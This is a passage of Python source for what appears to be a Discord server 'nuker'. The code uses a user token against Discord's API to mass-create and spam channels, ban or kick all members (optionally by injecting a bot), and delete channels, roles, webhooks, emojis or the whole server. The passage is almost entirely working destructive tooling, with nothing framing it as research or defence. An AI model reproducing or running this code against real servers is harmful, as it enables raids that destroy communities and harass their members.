                name = f"{channel_name}-{random.randint(1000, 9999)}" if channel_count > 1 else channel_name
                try:
                    response = requests.post(
                        f"{self.base_url}/guilds/{self.server_id}/channels",
                        headers=self.headers,
                        json={"name": name, "type": 0}
                    )
                    if response.status_code in [200, 201]:
                        channel_data = response.json()
                        created_channels.append(channel_data)
                        print(f"    [+] Created: {name}")
                    time.sleep(self.time_sleep)
                except:
                    pass
        except Exception as e:
            print(f"    [-] Error: {e}")

        print(f"\n[STEP 9/10] Spamming {len(created_channels)} channels...")
        try:
            for channel in created_channels:
                channel_id = channel['id']
                channel_name_display = channel.get('name', 'Unknown')
                sent = 0
                for i in range(spam_count):
                    try:
                        msg_response = requests.post(
                            f"{self.base_url}/channels/{channel_id}/messages",
                            headers=self.headers,
                            json={"content": spam_message}
                        )
                        if msg_response.status_code in [200, 201]:
                            sent += 1
                        time.sleep(self.time_sleep)
                    except:
                        break
                print(f"    [+] {channel_name_display}: {sent}/{spam_count} sent")
        except Exception as e:
            print(f"    [-] Error: {e}")

        if member_action in ["1", "2"]:
            action_name = "Banning" if member_action == "1" else "Kicking"
            print(f"\n[STEP 10/10] {action_name} members...")
            
            use_bot = False
            if self.bot_token and self.bot_headers:
                if not self.bot_in_server:
                    print("[+] Bot available, attempting injection...")
                    if self.inject_bot_auto():
                        self.bot_in_server = True
                        use_bot = True
                else:
                    use_bot = True

            if use_bot and self.bot_in_server:
                print("[+] Using bot method...")
                members = self.bot_fetch_all_members()
                
                if members:
                    print(f"[+] Bot fetched {len(members)} members")
                    if member_action == "1":
                        success, failed = self.bot_ban_members(members)
                        print(f"\n[+] Bot banned {success} members, {failed} failed")
                    else:
                        success, failed = self.bot_kick_members(members)
                        print(f"\n[+] Bot kicked {success} members, {failed} failed")
                else:
                    print("[-] Bot fetch failed, using fallback...")
                    self._mass_action_members("ban" if member_action == "1" else "kick")
            else:
                print("[+] Using user token method...")
                self._mass_action_members("ban" if member_action == "1" else "kick")
                
            if self.bot_in_server:
                self.remove_bot()
        else:
            print("\n[STEP 10/10] Skipping member actions...")

        print("\n[+] Judgament complete")

    def settings_menu(self):
        if self.role == "MEMBER":
            print("""
[!] Advanced settings unavailable - Member permissions only

[0] Back to main menu
""")
        elif self.role == "ADMIN":
            print("""
[1] Delete Channels         [2] Delete Roles
[3] Kick Members            [4] Ban Members
[5] Change Name             [6] Change Icon
[7] Delete Webhooks         [8] Create Channels
[9] Create Roles            [10] Spam Channels
[11] Delete Emojis          [14] JUDGAMENT
[0] Back
""")
        else:
            print("""
[1] Delete Channels         [2] Delete Roles
[3] Kick Members            [4] Ban Members
[5] Change Name             [6] Change Icon
[7] Delete Webhooks         [8] Create Channels
[9] Create Roles            [10] Spam Channels
[11] Delete Emojis          [12] Transfer Owner
[13] DELETE SERVER          [14] JUDGAMENT
[0] Back
""")

    def run(self):
        self.clear()
        self.banner()
        
        if self.bot_token:
            self.setup_bot()

        if not self.load_server():
            return

        self.show_server_info()

        while True:
            if not self.server_data:
                break

            self.settings_menu()
            choice = input("\nSelect: ").strip()

            if choice == "0":
                if self.bot_in_server:
                    self.remove_bot()
                break
            elif self.role == "MEMBER":
                print("[-] Invalid option")
            elif choice == "1":
                self.delete_all_channels()
            elif choice == "2":
                self.delete_all_roles()
            elif choice == "3":
                self.kick_all_members()
            elif choice == "4":
                self.ban_all_members()
            elif choice == "5":
                self.change_server_name()
            elif choice == "6":
                self.change_server_icon()
            elif choice == "7":
                self.delete_all_webhooks()
            elif choice == "8":
                self.create_channels()
            elif choice == "9":
                self.create_roles()
            elif choice == "10":
                self.spam_all_channels()
            elif choice == "11":
                self.delete_all_emojis()
            elif choice == "12" and self.role == "OWNER":
                self.transfer_ownership()
            elif choice == "13" and self.role == "OWNER":
                self.delete_server()
            elif choice == "14":
                self.judgament()
            else:
                print("[-] Invalid option")

            if self.server_data:
                input("\nPress ENTER to continue...")
                self.clear()
                self.banner()
                self.show_server_info()

if __name__ == "__main__":
    TOKEN = ""
    BASE_URL = "https://discord.com/api/v9"
    
    settings = ServerSettings(TOKEN, BASE_URL)
    settings.run()